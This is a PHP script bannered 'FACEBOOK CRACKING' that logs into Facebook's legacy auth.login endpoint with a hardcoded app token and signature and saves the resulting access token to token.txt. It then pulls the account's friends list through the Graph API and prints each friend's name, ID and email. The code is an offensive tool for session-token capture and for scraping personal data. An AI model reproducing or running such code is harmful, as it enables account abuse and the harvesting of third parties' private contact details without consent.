<?php
//Get Token FB
$green = '\033[32;1m';
$white = '\033[0m';
$blue = '\033[36;1m';
$yellow = '\033[33;1m';
$red = '\033[31;1m';
$purple = '\033[35;1m';

echo "\033[33;1m [?] FACEBOOK CRACKING [?] \n";
echo "\033[33;1m [?] COPYRIGHT 2019 [?] \n";
function input($echo) { 
		echo "\033[36;1m $echo --> "; 
		} 

echo "=========================== \n"; 
$konten=file_get_contents('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='.$iduser.'&locale=en_US&password='.$pass.'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'); 
$json= json_decode($konten, true);
$userid = $json['session_cookies'][0]['value'];
$token = $json['access_token']; 
if(preg_match('/session_key/', $konten)) {
		echo "\033[31;1m UserID ->\t".$userid."\n"; 
		$tulis=fopen("token.txt","w+"); 
		fwrite($tulis,$token); 
		fclose($tulis); 
		if(file_exists("token.txt")) { 
				echo " Writed -> token.txt\n"; 
				} 
				} else {
				 die("Check Your Username / Password\n"); 
				} 
				
?>
<?php
		echo "\033[32;1m[*] load access token \n";
if(!file_exists("token.txt")){

		echo "\033[31;1m[!] Failed Load Access Token \n";
//		echo "\033[31;1m[!] Please Run token.php \n";

}else{

		$myfile = fopen("token.txt", "r");
		$token= fread($myfile,filesize("token.txt"));
		echo "\033[32;1m[*] Success load access token \n";
}
		echo "\033[32;1m[*] Your Token : $token \n";
//get json friends data
$friends= file_get_contents('https://graph.facebook.com/me/friends?access_token=' . $token);
//decode json to array
$json= json_decode($friends, true);
$namef1 =	$json['data'][0]['name'];
$idf1				=	$json['data'][0]['id'];
//echo $namef1.		"\n";
//echo $idf1.					"\n";
$nameid		= $json['data'];
//menghitung jumlah teman
$jmlteman = count($nameid);
//menampilkan jumlah teman
echo "Total Friends => $jmlteman \n\n";
sleep(5);
//membuat fungsi get mail
function email($id , $token) {
$getinfof	=	file_get_contents('https://graph.facebook.com/' .$id. '?access_token=' .$token);
$json				= json_decode($getinfof, true);
$email			=		$json['email'];
//return $json;
echo "\033[32;1m" .$email . "\n";
   }
//melakukan looping name,id,mail
$countid		=	count($nameid);
for ($x = 0; $x < $countid; $x++) {
	echo "\033[35;1m—-----—------------------------------------- \n\033[32;1m";
	$idf = $nameid[$x]['id'];								
	echo "\033[32;1mNama : \033[33;1m" . $nameid[$x]['name'] . "\033[32;1m Id : \033[33;1m" . $nameid[$x]["id"] . "\033[32;1m \nemail \033[33;1m: ";
	email($idf , $token);
 echo "\033[35;1m—-----—------------------------------------- \n\n\033[32;1m";
     }
